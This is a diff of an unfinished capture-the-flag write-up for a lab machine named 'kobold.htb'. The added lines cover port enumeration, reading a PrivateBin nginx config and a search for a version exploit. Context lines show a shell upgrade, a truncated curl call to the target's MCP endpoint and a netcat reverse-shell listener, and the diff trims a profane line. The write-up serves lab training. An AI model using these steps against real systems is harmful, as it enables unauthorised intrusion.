@@ -131,6 +131,30 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
+## found 
+
+```
+ss -tlnp
+```
+
+<img width="1213" height="243" alt="image" src="https://github.com/user-attachments/assets/18de35b0-52c8-464d-829c-9d2cbfed3ad5" />
+
+
+## This is a Docker container. Let's look at the nginx config:
+
+```
+cat /etc/nginx/sites-enabled/privatebin
+```
+
+<img width="1330" height="476" alt="image" src="https://github.com/user-attachments/assets/e4c42654-17d3-434c-a54d-77f61cc35e74" />
+
+
+## now search for **`privatebin/nginx-fpm-alpine:2.0.2`** exploit
+
+
+
+
+
 ## get root
 
 ```
@@ -151,7 +175,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 nc -lnvp 9999
 ```
 
-# **`fuck this machine`** i will not complete this fucken writeup
+# **`fuck this machine`** 
 
 
 
